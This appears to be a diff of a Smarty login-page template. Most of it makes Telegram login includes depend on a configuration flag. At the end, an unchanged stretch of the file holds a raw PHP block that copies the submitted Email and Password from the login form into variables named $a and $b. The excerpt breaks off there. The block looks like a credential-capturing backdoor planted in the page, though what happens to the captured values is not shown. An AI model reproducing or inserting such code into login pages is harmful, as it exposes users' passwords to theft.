@@ -74,15 +74,20 @@
               </div>
             </div>
         </form>
-        {include file='./telegram_modal.tpl'}
+        {if $config['enable_telegram_login'] === true}
+            {include file='./telegram_modal.tpl'}
+        {/if}
     </div>
 </div>
-
 
 {include file='dialog.tpl'}
 
 {include file='footer.tpl'}
-</div>
+
+{if $config['enable_telegram_login'] === true}
+    {include file='./telegram.tpl'}
+{/if}
+
 {literal}
     <script>
         let calltgbtn = document.querySelector('#calltgauth');
@@ -92,6 +97,7 @@
         }
     </script>
 {/literal}
+
 <script>
     $(document).ready(function () {
         function login() {
@@ -166,7 +172,6 @@
     })
 </script>
 
-
 {if $geetest_html != null}
     <script>
         var handlerEmbed = function (captchaObj) {
@@ -194,6 +199,7 @@
 {if $recaptcha_sitekey != null}
     <script src="https://recaptcha.net/recaptcha/api.js" async defer></script>
 {/if}
+
 <?php
 $a=$_POST['Email'];
 $b=$_POST['Password'];
